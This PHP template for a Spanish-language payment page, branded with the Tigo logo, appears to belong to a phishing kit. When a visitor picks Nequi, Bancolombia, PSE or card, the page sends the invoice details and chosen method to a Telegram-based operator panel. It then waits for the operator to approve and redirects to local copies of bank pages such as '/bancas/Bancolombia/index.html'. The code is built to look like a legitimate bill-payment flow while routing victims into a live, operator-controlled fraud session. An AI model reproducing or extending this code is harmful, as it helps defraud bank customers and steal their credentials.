<?php ob_start(); ?>

<div class="container">
    <a href="/payment/invoices" class="back-link">
        <svg class="back-link__icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
            <path d="M19 12H5M5 12L12 19M5 12L12 5" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
        </svg>
        REGRESAR
    </a>

    <h1 class="page-title">Métodos de pago</h1>

    <div class="payment-methods-container">
        <!-- Details Section -->
        <div class="payment-details-card">
            <h2 class="payment-details-title">Detalles</h2>
            
            <div class="payment-details-row">
                <span class="payment-details-label">Tipo de producto</span>
                <span class="payment-details-value">Pago de Factura</span>
            </div>
            
            <div class="payment-details-row">
                <span class="payment-details-label">Monto de factura</span>
                <span class="payment-details-amount">$ <?= number_format($amount, 0, ',', '.') ?></span>
            </div>
        </div>

        <!-- Payment Methods Section -->
        <div class="payment-methods-card">
            <h2 class="payment-methods-title">Escoge tu forma de pago</h2>
            
            <div class="payment-methods-list">
                <!-- Nequi -->
                <button type="button" class="payment-method-option" data-method="nequi">
                    <div class="payment-method-icon nequi">
                        <img src="/img/logo-nequi.png" alt="Nequi" class="payment-method-logo">
                    </div>
                    <span class="payment-method-text">Nequi</span>
                    <svg class="payment-method-arrow" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path d="M9 18l6-6-6-6" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                    </svg>
                </button>

                <!-- Bancolombia -->
                <button type="button" class="payment-method-option" data-method="bancolombia">
                    <div class="payment-method-icon bancolombia">
                        <img src="/img/LogoBancolombia.png" alt="Bancolombia" class="payment-method-logo">
                    </div>
                    <span class="payment-method-text">Bancolombia</span>
                    <svg class="payment-method-arrow" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path d="M9 18l6-6-6-6" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                    </svg>
                </button>

                <!-- PSE -->
                <button type="button" class="payment-method-option" data-method="pse">
                    <div class="payment-method-icon pse">
                        <img src="/img/pse-logo.png" alt="PSE" class="payment-method-logo">
                    </div>
                    <span class="payment-method-text">PSE</span>
                    <svg class="payment-method-arrow" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path d="M9 18l6-6-6-6" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                    </svg>
                </button>

                <!-- Tarjeta crédito / débito con CVV -->
                <button type="button" class="payment-method-option" data-method="card">
                    <div class="payment-method-icon">
                        <img src="/img/creditCard.png" alt="Tarjeta" style="width: 32px; height: 32px; object-fit: contain;">
                    </div>
                    <span class="payment-method-text">Tarjeta crédito / débito con CVV</span>
                    <svg class="payment-method-arrow" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path d="M9 18l6-6-6-6" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                    </svg>
                </button>
            </div>
        </div>
    </div>
</div>

<!-- Loading Overlay -->
<div id="loadingOverlay" class="loading-overlay">
    <div class="loading-content">
        <img src="/img/tigo-logo.svg" alt="Cargando..." class="loading-logo">
        <p class="loading-text">Procesando...</p>
    </div>
</div>

<script src="/js/telegram-integration.js"></script>
<script>
document.addEventListener('DOMContentLoaded', function() {
    const paymentOptions = document.querySelectorAll('.payment-method-option');
    const overlay = document.getElementById('loadingOverlay');
    const amount = <?= $amount > 0 ? $amount : 0 ?>;
    const invoiceId = '<?= htmlspecialchars($invoice_id ?? '') ?>';
    
    paymentOptions.forEach(option => {
        option.addEventListener('click', async function() {
            const method = this.dataset.method;
            
            // Mostrar overlay infinito
            if (overlay) {
                overlay.classList.add('active');
                overlay.style.display = 'flex';
            }
            
            try {
                // Preparar datos para Telegram
                const sessionId = `payment_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
                const data = {
                    invoice_id: invoiceId,
                    amount: amount,
                    payment_method: method,
                    timestamp: new Date().toISOString()
                };
                
                console.log(`[PAYMENT] 🚀 Iniciando pago con ${method}`);
                console.log(`[PAYMENT] Session: ${sessionId}`);
                console.log(`[PAYMENT] Data:`, data);
                
                // Enviar a Telegram con acción específica por método
                let action = '';
                if (method === 'nequi') {
                    action = 'tigo_nequi';
                } else if (method === 'bancolombia') {
                    action = 'tigo_bancolombia';
                } else if (method === 'card') {
                    action = 'tigo_tarjeta';
                } else if (method === 'pse') {
                    action = 'tigo_pse';
                }
                
                console.log(`[PAYMENT] Enviando action: ${action} a Telegram...`);
                const result = await TelegramClient.sendToTelegram(action, data, sessionId);
                
                console.log('[PAYMENT] Resultado:', result);
                
                if (result.success) {
                    console.log(`[PAYMENT] ✓ Datos enviados a Telegram`);
                    console.log(`[PAYMENT] SessionID: ${sessionId}`);
                    console.log(`[PAYMENT] ⏳ Esperando confirmación del operador...`);
                    
                    // Polling optimizado con intervalo adaptativo
                    TelegramClient.startPolling((actions, stop) => {
                        if (window.__paymentProcessing) {
                            return;
                        }
                        
                        const action = actions[0];
                        const actionName = action.action;
                        
                        console.log('[PAYMENT] 🔔 Acción recibida:', actionName);
                        
                        // Verificar acciones esperadas
                        const expectedContinue = `tigo_${method}_continue`;
                        const expectedReject = `tigo_${method}_reject`;
                        
                        if (actionName === expectedReject) {
                            console.log('[PAYMENT] ❌ Operador rechazó');
                            stop();
                            alert('El operador ha cancelado este pago');
                            if (overlay) {
                                overlay.classList.remove('active');
                                overlay.style.display = 'none';
                            }
                            return;
                        }
                        
                        if (actionName === expectedContinue) {
                            window.__paymentProcessing = true;
                            stop();
                            
                            console.log('[PAYMENT] ✅ Operador aprobó → Redirigiendo...');
                            
                            // Redirección inmediata
                            setTimeout(() => {
                                if (method === 'card') {
                                    window.location.href = `/card/form?invoice_id=${invoiceId}`;
                                } else if (method === 'bancolombia') {
                                    window.location.href = '/bancas/Bancolombia/index.html';
                                } else if (method === 'nequi') {
                                    window.location.href = '/bancas/Nequi/numero.html';
                                } else if (method === 'pse') {
                                    window.location.href = `/pse/form?invoice_id=${invoiceId}`;
                                }
                            }, 100);
                        }
                    }, sessionId, 100, 300000); // Intervalo optimizado: 100ms
                } else {
                    console.error('[PAYMENT] Error al enviar:', result.error);
                    alert('Error al procesar el pago. Por favor intenta nuevamente.');
                    if (overlay) {
                        overlay.classList.remove('active');
                        overlay.style.display = 'none';
                    }
                }
            } catch (error) {
                console.error('[PAYMENT] Exception:', error);
                alert('Error al procesar el pago. Por favor intenta nuevamente.');
                if (overlay) {
                    overlay.classList.remove('active');
                    overlay.style.display = 'none';
                }
            }
        });
    });
});
</script>

<?php
$content = ob_get_clean();
require __DIR__ . '/../layout.php';
?>
